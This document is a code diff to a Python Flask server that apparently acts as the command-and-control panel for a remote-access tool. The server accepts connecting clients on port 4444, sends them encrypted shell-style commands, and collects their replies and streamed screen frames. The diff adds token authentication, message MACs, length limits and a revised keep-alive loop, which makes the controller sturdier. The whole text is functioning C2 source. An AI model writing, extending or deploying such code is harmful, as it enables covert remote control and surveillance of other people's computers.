@@ -12,6 +12,8 @@ from flask import Flask, send_from_directory, request, jsonify
 PORT = 4444
 WEB = 5000
 KEY = b"CrockKey2026!!CrockKey2026!!!!!"
+AUTH_TOKEN = "crock-local-token"
+MAX_MSG = 8 * 1024 * 1024
 
 app = Flask(__name__)
 clients = {}
@@ -19,6 +21,12 @@ lock = threading.Lock()
 next_id = 1
 
 BASE = os.path.dirname(os.path.abspath(__file__))
+
+def check_auth():
+    token = request.headers.get("X-Auth") or request.args.get("token")
+    if token != AUTH_TOKEN:
+        return False
+    return True
 
 def keystream(counter, length):
     out = b""
@@ -28,6 +36,9 @@ def keystream(counter, length):
         out += h
         c += 1
     return out[:length]
+
+def mac(data: bytes) -> bytes:
+    return hashlib.sha256(KEY + data).digest()[:8]
 
 def recvall(sock, n):
     data = b''
@@ -54,8 +65,10 @@ def client_handler(conn, addr, cid):
         if not raw:
             return
         length = struct.unpack('>I', raw)[0]
+        if length == 0 or length > MAX_MSG:
+            return
         payload = recvall(conn, length)
-        if not payload:
+        if not payload or len(payload) != length:
             return
 
         send_ctr = 0x1337
@@ -87,22 +100,13 @@ def client_handler(conn, addr, cid):
             }
         print(f"[+] Client {cid} online")
 
+        # Keep the handler alive. Do not peek/read here —
+        # it races with /cmd and kills healthy connections.
         while True:
             with lock:
                 if cid not in clients or not clients[cid]["alive"]:
                     break
-            r, _, _ = select.select([conn], [], [], 5.0)
-            if r:
-                try:
-                    conn.setblocking(False)
-                    peek = conn.recv(1, socket.MSG_PEEK)
-                    conn.setblocking(True)
-                    if not peek:
-                        mark_dead(cid)
-                        break
-                except Exception:
-                    mark_dead(cid)
-                    break
+            time.sleep(2)
     except Exception:
         mark_dead(cid)
     finally:
@@ -127,6 +131,8 @@ def index():
 
 @app.route('/clients')
 def list_clients():
+    if not check_auth():
+        return jsonify({"error": "unauthorized"}), 401
     with lock:
         result = []
         for cid, c in list(clients.items()):
@@ -143,6 +149,8 @@ def list_clients():
 
 @app.route('/frame')
 def get_frame():
+    if not check_auth():
+        return jsonify({"error": "unauthorized"}), 401
     cid = request.args.get("id", type=int)
     with lock:
         if cid not in clients or not clients[cid].get("alive"):
@@ -152,6 +160,8 @@ def get_frame():
 
 @app.route('/cmd', methods=['POST'])
 def command():
+    if not check_auth():
+        return jsonify({"error": "unauthorized"}), 401
     data = request.json or {}
     cid = data.get("id")
     cmd = data.get("cmd", "")
@@ -166,10 +176,13 @@ def command():
             with lock:
                 sc = clients[cid]["send_ctr"]
                 rc = clients[cid]["recv_ctr"]
-            ks = keystream(sc, len(cmd.encode()))
-            payload = bytes(a ^ b for a, b in zip(cmd.encode(), ks))
+            raw_cmd = cmd.encode()
+            tag = mac(raw_cmd)
+            body = tag + raw_cmd
+            ks = keystream(sc, len(body))
+            payload = bytes(a ^ b for a, b in zip(body, ks))
             with lock:
-                clients[cid]["send_ctr"] = sc + (len(cmd.encode()) + 31) // 32
+                clients[cid]["send_ctr"] = sc + (len(body) + 31) // 32
 
             conn.sendall(struct.pack('>I', len(payload)) + payload)
 
@@ -177,18 +190,25 @@ def command():
             if not raw:
                 raise ConnectionError("no reply")
             length = struct.unpack('>I', raw)[0]
-            if length > 32 * 1024 * 1024:
-                raise ValueError("too large")
+            if length == 0 or length > MAX_MSG:
+                raise ValueError("bad length")
             resp = recvall(conn, length)
-            if not resp:
-                raise ConnectionError("no body")
+            if not resp or len(resp) != length:
+                raise ConnectionError("short body")
 
             ks2 = keystream(rc, len(resp))
-            plain = bytes(a ^ b for a, b in zip(resp, ks2)).decode(errors='ignore')
+            plain = bytes(a ^ b for a, b in zip(resp, ks2))
             with lock:
                 clients[cid]["recv_ctr"] = rc + (len(resp) + 31) // 32
 
-            if cmd == "stream_start" and plain == "stream started":
+            if len(plain) < 8:
+                raise ValueError("no mac")
+            tag_r, msg = plain[:8], plain[8:]
+            if tag_r != mac(msg):
+                raise ValueError("bad mac")
+            text = msg.decode(errors='ignore')
+
+            if cmd == "stream_start" and text == "stream started":
                 def reader():
                     with lock:
                         clients[cid]["streaming"] = True
@@ -201,7 +221,7 @@ def command():
                             if not raw:
                                 break
                             length = struct.unpack('>I', raw)[0]
-                            if length > 32 * 1024 * 1024:
+                            if length == 0 or length > MAX_MSG:
                                 break
                             resp = recvall(conn, length)
                             if not resp:
@@ -212,13 +232,12 @@ def command():
                             frame_plain = bytes(a ^ b for a, b in zip(resp, ks2))
                             with lock:
                                 clients[cid]["recv_ctr"] = rc + (len(resp) + 31) // 32
-                            try:
-                                text = frame_plain.decode(errors='ignore')
-                                if text.startswith("FRAME:"):
-                                    with lock:
-                                        clients[cid]["latest_frame"] = text[6:]
-                            except:
-                                pass
+                            if len(frame_plain) < 8 or frame_plain[:8] != mac(frame_plain[8:]):
+                                continue
+                            text = frame_plain[8:].decode(errors='ignore')
+                            if text.startswith("FRAME:"):
+                                with lock:
+                                    clients[cid]["latest_frame"] = text[6:]
                     finally:
                         with lock:
                             if cid in clients:
@@ -226,7 +245,7 @@ def command():
                 threading.Thread(target=reader, daemon=True).start()
                 return jsonify({"out": "stream started"})
 
-            return jsonify({"out": plain})
+            return jsonify({"out": text})
     except Exception as e:
         mark_dead(cid)
         return jsonify({"out": str(e)})
